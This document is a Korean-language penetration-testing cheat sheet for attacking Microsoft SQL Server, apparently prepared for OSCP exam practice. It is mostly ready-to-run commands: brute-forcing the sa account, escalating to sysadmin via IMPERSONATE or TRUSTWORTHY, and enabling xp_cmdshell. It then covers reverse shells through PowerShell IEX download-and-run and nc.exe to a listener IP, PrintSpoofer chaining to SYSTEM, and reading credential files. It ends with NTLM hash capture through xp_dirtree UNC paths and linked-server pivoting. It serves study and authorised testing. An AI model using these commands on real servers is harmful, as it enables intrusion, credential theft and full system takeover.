# MSSQL

# MSSQL (1433)

Microsoft SQL Server. xp_cmdshell을 통한 OS 명령 실행, 파일 읽기/쓰기, 연결된 서버 이동이 주요 공격 벡터. OSCP 머신에서 자주 등장.

---

## 1. 열거

`ms-sql-info`는 버전/인스턴스명을, `ms-sql-ntlm-info`는 서버가 응답하는 NTLM 정보(도메인/컴퓨터명)를 뽑아준다 — 둘 다 인증 없이 얻을 수 있는 정찰 정보다. `ms-sql-empty-password`는 `sa` 계정 빈 비밀번호를 자동으로 시도해준다.

```bash
# nmap
nmap -p 1433 --script=ms-sql-info,ms-sql-config,ms-sql-empty-password <IP>
nmap -p 1433 --script=ms-sql-ntlm-info <IP>
nmap -sV -p 1433 <IP>

# netexec
nxc mssql <IP>
nxc mssql <IP> -u '' -p ''
nxc mssql <IP> -u 'sa' -p ''
```

---

## 2. 접속

```bash
# impacket-mssqlclient (가장 많이 사용)
impacket-mssqlclient sa@<IP>
impacket-mssqlclient sa:'password'@<IP>
impacket-mssqlclient -windows-auth DOMAIN/user:'password'@<IP>

# -port 옵션
impacket-mssqlclient sa:'password'@<IP> -port 1433

# sqsh (Linux)
sqsh -S <IP> -U sa -P password

# sqlcmd (Windows)
sqlcmd -S <IP> -U sa -P password
sqlcmd -S <IP> -U sa -P password -Q "SELECT @@version"

# netexec
nxc mssql <IP> -u sa -p 'password' --local-auth
```

### 브루트포스

```bash
# hydra
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<IP>

# netexec
nxc mssql <IP> -u users.txt -p passwords.txt --continue-on-success
nxc mssql <IP> -u sa -p passwords.txt --local-auth

# nmap
nmap -p 1433 --script=ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt <IP>
```

### Windows 인증 (NTLM)

SQL Server Authentication(별도 유저명/비번, sa 등)과 Windows Authentication(도메인 계정으로 로그인, 내부적으로 NTLM/Kerberos 사용)은 별개 인증 모드다. Windows 인증 성공 시 SQL 안에서도 그 도메인 계정 컨텍스트를 그대로 물려받는다.

```bash
# 도메인 계정으로 접속
impacket-mssqlclient -windows-auth CORP/john:'Password1!'@<IP>
impacket-mssqlclient -windows-auth -hashes :<NTLM> CORP/john@<IP>

# netexec
nxc mssql <IP> -u john -p 'Password1!' -d CORP
nxc mssql <IP> -u john -H <NTLM> -d CORP
```

---

## 3. 기본 명령어 (정찰)

```sql
-- 버전 확인
SELECT @@version;

-- 현재 사용자 / sysadmin 여부
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1이면 sysadmin, xp_cmdshell 활성화 가능

-- 이 SQL 서비스가 어떤 Windows 계정으로 도는지 (도메인 계정이면 그 계정 권한으로 인증됨)
SELECT servicename, service_account FROM sys.dm_server_services;

-- DB 목록 / 테이블 목록
SELECT name FROM master.dbo.sysdatabases;
EXEC sp_databases;
SELECT table_name FROM information_schema.tables;

-- 로그인 계정 목록
SELECT name, password_hash FROM sys.sql_logins;
SELECT name FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';

-- Linked Server 목록 (내부망 이동 경로, 8번 참고)
EXEC sp_linkedservers;
SELECT name FROM sys.servers WHERE is_linked = 1;
```

---

## 4. SQL 내부 권한상승 — sysadmin 아니어도 sysadmin 되기

`IS_SRVROLEMEMBER('sysadmin')`이 0으로 나와도 포기하지 말 것. sysadmin으로 승격할 수 있는 SQL 자체 경로가 두 가지 있다.

### IMPERSONATE 권한 악용

저권한 로그인이라도 다른(더 강한) 로그인에 대해 `IMPERSONATE` 권한을 부여받아 놓은 경우가 있다. 이 권한만 있으면 `EXECUTE AS`로 그 계정인 척 전환할 수 있다 — 대상이 `sa`면 곧바로 sysadmin이 되는 셈.

```sql
-- 내가 IMPERSONATE 가능한 로그인 목록 확인
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- sa로 전환 시도
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;              -- sa로 바뀌었는지 확인
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1 나오면 성공

REVERT;   -- 원래 컨텍스트로 복귀
```

### TRUSTWORTHY 데이터베이스 + db_owner 악용

어떤 DB가 `TRUSTWORTHY ON`으로 설정돼 있고 내가 그 DB의 `db_owner`면, 그 안에 만든 저장 프로시저는 (그 DB) 소유자 권한(보통 sysadmin급 sa)으로 실행된다.

```sql
-- TRUSTWORTHY 여부 확인
SELECT name, is_trustworthy_on FROM sys.databases;

-- db_owner 권한으로 sysadmin 저장 프로시저 생성 후 xp_cmdshell 활성화
USE <trustworthy_db>;   -- ← 수정
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

---

## 5. xp_cmdshell — OS 명령 실행

SQL 쿼리 안에서 OS 명령을 그대로 실행하는 확장 저장 프로시저. SQLi 하나로 OS 장악까지 이어질 수 있어 MSSQL 2005+부터 기본 비활성화 상태이며, sysadmin 권한이 있으면 직접 켤 수 있다.

```sql
-- xp_cmdshell 활성화 (sysadmin 필요)
-- sp_configure: 설정값 변경만 함 / RECONFIGURE: 그 변경을 서버에 실제 적용 (항상 짝으로 실행, 하나만 하면 무효)
EXEC sp_configure 'show advanced options', 1;  -- xp_cmdshell 포함된 "고급 옵션" 카테고리를 노출
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;             -- 노출된 고급 옵션 중 xp_cmdshell 자체를 활성화
RECONFIGURE;

-- 명령 실행
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';   -- SeImpersonatePrivilege 있는지 확인 (아래 체이닝 섹션에서 사용)
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\root.txt';

-- 파일 쓰기
EXEC xp_cmdshell 'echo test > C:\Windows\Temp\test.txt';

-- impacket-mssqlclient 안에서는 단축 명령 제공
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### 리버스쉘 — 방법 A: IEX 다운로드-실행 (파일리스, 아웃바운드 HTTP 필요)

대상이 우리(칼리 또는 발판 머신)로 HTTP 아웃바운드가 가능해야 한다. 디스크에 파일을 안 남기는 대신, 미리 웹서버를 띄워둬야 한다.

### PowerShell 리버스쉘 스크립트(`shell.ps1`) 만들기

```bash
# 방법 1 — nishang Invoke-PowerShellTcp.ps1 활용 (가장 흔함)
locate Invoke-PowerShellTcp.ps1
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress <리스너IP> -Port <포트>' >> shell.ps1

# 방법 2 — msfvenom으로 생성
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<리스너IP> LPORT=<포트> -f psh -o shell.ps1
```

```bash
# 칼리(또는 도달 가능한 발판)에서 shell.ps1 웹서버로 서빙
python3 -m http.server 80
```

```sql
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<리스너IP>/shell.ps1'')"; ';

-- nc.exe가 이미 디스크에 있는 경우 (별도 업로드 필요)
EXEC xp_cmdshell 'C:\Temp\nc.exe -e cmd.exe <리스너IP> 4444';
```

### 리버스쉘 — 방법 B: 권한상승 도구와 체이닝 (파일 업로드 경로가 있을 때, 실전에서 가장 흔함)

xp_cmdshell로 처음 얻는 권한은 보통 `nt service\mssql$...` 같은 낮은 서비스 계정이다. `whoami /priv`로 `SeImpersonatePrivilege`가 Enabled면, PrintSpoofer 같은 도구의 `-c` 옵션으로 "권한상승 성공 시 이 명령을 SYSTEM 권한으로 실행"을 지정해서 **권한상승과 리버스쉘 획득을 한 번에** 처리할 수 있다. 이 방식은 대상이 우리에게 아웃바운드 HTTP가 안 될 때도 쓸 수 있다 — 대신 도구 파일들을 먼저 대상에 올려야 한다 (SMB, certutil, 또는 웹앱 자체의 파일 업로드 기능 등 — 09_피버팅_터널링 "발판 머신에 도구 올리기" 참고).

```sql
-- PrintSpoofer64.exe, nc.exe를 미리 업로드해둔 경로에서 실행
EXEC xp_cmdshell 'C:\Temp\PrintSpoofer64.exe -c "C:\Temp\nc.exe <리스너IP> <포트> -e cmd"';
-- -c            : 권한상승 성공 시 SYSTEM 권한으로 실행할 명령
-- -e cmd        : 연결에 성공하면 cmd.exe를 그 연결에 그대로 붙여서 전달 (대화형 쉘)
-- <리스너IP>     : SQL 서버가 실제로 도달 가능한 곳이어야 함 — 피벗 환경이면 발판 머신 IP
--                 (SQL 서버가 우리 칼리로 직접 못 나가는 내부망이면 발판 머신에서 리스너를 켜야 함)
```

```bash
# 리스너는 도달 가능한 쪽(칼리 또는 발판 머신)에서 미리 대기
nc -lnvp <포트>
```

named pipe impersonation의 상세 동작 원리는 `06_SeImpersonatePrivilege_Potato` 참고.

### 웹앱 경유 접근 (1433 포트 미노출 시)

DNN 등 자체 관리 콘솔이 있는 웹앱은 SQL 실행 GUI를 내장하기도 한다. 1433이 스캔에 안 잡히거나 방화벽에 막혀도, 웹앱 관리자 권한만 있으면 이 경로로 xp_cmdshell 접근이 가능할 수 있다 — "1433 안 열림 = MSSQL 공격 불가"로 단정하지 말 것. 구체 사례는 `05_HTTP_HTTPS_80_443/DNN` 참고.

### 대안 — CLR 어셈블리 (xp_cmdshell이 완전히 제거된 경우)

CLR(Common Language Runtime)로 .NET 어셈블리를 컴파일해서 커스텀 SQL 함수로 로드하면, xp_cmdshell 없이도 임의 코드 실행이 가능하다. sysadmin(또는 CLR 관련 DB 권한) 필요.

```sql
-- CLR 활성화
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
-- 이후 CREATE ASSEMBLY로 악성 .NET DLL 로드 → 함수로 노출 → 호출 (도구: SQLRecon, HackTricks CLR RCE 참고)
```

---

## 6. 파일 읽기 (OPENROWSET / BULK)

`xp_cmdshell` 없이도 파일을 읽을 수 있는 경로다. 다만 `BULK` 옵션은 `ADMINISTER BULK OPERATIONS` 또는 `ADMINISTER DATABASE BULK OPERATIONS` 권한이 필요하다 (sysadmin이면 자동으로 있음).

```sql
-- 파일 읽기
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS tmp;
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_BLOB) AS x;

-- 실전 팁: PowerShell 히스토리에 평문 크리덴셜이 남아있는 경우가 많음
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS p;
```

---

## 7. 해시 캡처 (UNC 경로 강제 인증)

`xp_dirtree`는 원래 디렉터리 목록을 보여주는 확장 프로시저인데, 인자로 UNC 경로(`\\공격자IP\share`)를 주면 SQL Server가 실제로 그 경로에 파일 I/O를 시도한다. 이때 **SQL Server 서비스 계정 자신이** 그 SMB 공유에 인증을 시도하면서 NTLM 핸드셰이크가 발생하고, 우리가 띄운 Responder/SMB 서버가 그 인증 시도를 가로채 Net-NTLMv2 해시를 받아낸다. `xp_subdirs`/`xp_fileexist`도 같은 원리로 동작한다. sysadmin이 아니어도 이 프로시저들이 PUBLIC 권한으로 열려 있는 경우가 많다.

```bash
# 칼리에서 Responder 실행
sudo responder -I eth0 -wv
```

```sql
-- UNC 경로로 NTLMv2 해시 유도
EXEC xp_dirtree '\\<칼리IP>\share';
EXEC xp_subdirs '\\<칼리IP>\share';
EXEC xp_fileexist '\\<칼리IP>\share\test';

-- 또는
SELECT * FROM OPENROWSET(BULK '\\<칼리IP>\share\file.txt', SINGLE_CLOB) AS tmp;
```

```bash
# 캡처한 Net-NTLMv2 해시 크랙 (hashcat 모드 5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Metasploit 자동화 모듈
msf6 > use auxiliary/admin/mssql/mssql_ntlm_stealer
```

---

## 8. Linked Server 이동

Linked Server는 한 MSSQL 인스턴스가 다른 MSSQL(또는 타 DB) 인스턴스를 신뢰하고 그 서버의 데이터/명령을 마치 로컬처럼 쓸 수 있게 해주는 기능이다 (`sp_linkedservers`로 확인). 이 신뢰 관계가 체이닝되어 있으면(A→B→C), A만 뚫어도 C까지 넘어갈 수 있다 — 실전에서 중요한 횡이동 경로.

```sql
-- 연결된 서버 확인
EXEC sp_linkedservers;

-- 연결된 서버에서 명령 실행
EXEC ('xp_cmdshell''whoami''') AT [LINKED_SERVER_NAME];
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT SYSTEM_USER');

-- 연결된 서버에서 xp_cmdshell 활성화
EXEC ('sp_configure''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('sp_configure''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('xp_cmdshell''whoami''') AT [LINKED_SERVER];
```

### Linked Server를 통한 원격 해시 캡처 (직접 xp_cmdshell 권한 없어도 가능)

내가 로컬에서 sysadmin이 아니어도, `OPENQUERY`로 연결된 서버 쪽에서 `xp_dirtree`를 실행시키면 **그 원격 서버의 서비스 계정** 해시를 캡처할 수 있다. 링크가 중첩(nested)돼 있으면 여러 단계 너머의 서버까지 이 방식으로 도달 가능.

```sql
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT 1; EXEC master..xp_dirtree ''\\<칼리IP>\share''');
```

```bash
# mssqlpwner — Linked Server 체인 자동 탐색 + NTLM relay
mssqlpwner corp.com/user:lab@<IP> -windows-auth -link-name SRV01 ntlm-relay <칼리IP>
```

---

## Metasploit 모듈 모음 (참고)

```bash
msf6 > use admin/mssql/mssql_enum                          # 종합 정보 수집
msf6 > use admin/mssql/mssql_enum_domain_accounts           # 도메인 계정 열거
msf6 > use auxiliary/scanner/mssql/mssql_hashdump           # 로그인 해시 덤프
msf6 > use admin/mssql/mssql_escalate_execute_as            # IMPERSONATE 권한 자동 악용
msf6 > use admin/mssql/mssql_escalate_dbowner               # db_owner → sysadmin 자동화
msf6 > use exploit/windows/mssql/mssql_linkcrawler          # Linked Server 체인 자동 크롤링/공격
```

---

## 팁

- `IS_SRVROLEMEMBER('sysadmin')` 이 1이면 xp_cmdshell 활성화 가능. 0이어도 IMPERSONATE/TRUSTWORTHY 경로로 sysadmin 승격 가능한지 반드시 확인할 것
- sa 계정 빈 패스워드 자주 발생
- `sys.dm_server_services`로 서비스 계정이 도메인 계정인지 확인해두면, 나중에 이 계정의 해시/권한이 AD 횡이동에 쓸모 있을지 미리 판단 가능
- 리버스쉘은 상황에 따라 방법 A(IEX, 아웃바운드 필요)와 방법 B(파일 업로드 + 권한상승 도구 체이닝, 피벗 환경에 유용) 중 골라 쓸 것
- Windows 인증 모드에서는 현재 컨텍스트 사용자로 접속 시도
- Linked Server는 내부망 이동에 핵심 경로 — sysadmin이 아니어도 xp_dirtree 릴레이로 원격 서버 해시를 캡처할 수 있다는 점을 놓치지 말 것